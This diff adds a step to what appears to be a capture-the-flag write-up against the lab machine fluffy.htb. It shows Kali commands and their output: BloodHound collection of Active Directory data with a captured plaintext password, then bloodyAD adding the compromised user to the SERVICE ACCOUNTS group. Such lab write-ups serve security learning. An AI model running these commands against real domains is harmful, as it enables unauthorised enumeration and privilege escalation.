@@ -333,3 +333,30 @@ Stopped: Sat Jun 28 08:00:27 2025
 
 
 ## STEP 4
+```sh
+┌──(kali㉿kali)-[~]
+└─$ bloodhound-python -u 'p.agila' -p 'prometheusx-303'  -d fluffy.htb -ns 10.129.232.88 -c All --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: fluffy.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.fluffy.htb:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: dc01.fluffy.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.fluffy.htb
+INFO: Found 10 users
+INFO: Found 54 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.fluffy.htb
+INFO: Done in 01M 15S
+INFO: Compressing output into 20250629085201_bloodhound.zip
+```
+```sh
+└─$ bloodyAD --host '10.129.232.88' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila   
+[+] p.agila added to SERVICE ACCOUNTS
+```
